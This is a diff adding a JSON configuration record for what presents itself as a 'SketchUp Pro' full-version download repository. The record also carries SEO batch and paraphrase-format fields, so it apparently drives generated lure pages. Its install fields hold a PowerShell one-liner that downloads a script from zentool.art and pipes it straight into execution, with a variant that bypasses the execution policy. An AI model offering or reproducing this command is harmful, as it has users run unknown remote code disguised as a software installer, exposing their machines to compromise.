@@ -1,0 +1,33 @@
+{
+  "repo": "SketchUp-Pro-Edition",
+  "product": "SketchUp-Pro-Edition",
+  "product_title": "SketchUp Pro",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_url": "https://zentool.art/",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "health_url": "https://zentool.art/health",
+  "batch": "fat-seo-no-year",
+  "format": "license-md-geogit-v5-paraphrase-seo",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "sketchup-pro",
+    "sketchup-pro-edition",
+    "3d-modeling",
+    "architecture-tools",
+    "interior-design",
+    "3d-visualization",
+    "modeling-workflow",
+    "design-software",
+    "windows-cad",
+    "spatial-design",
+    "complete-version",
+    "download",
+    "full-installer",
+    "windows-11",
+    "windows-software"
+  ],
+  "site": "zentool.art"
+}
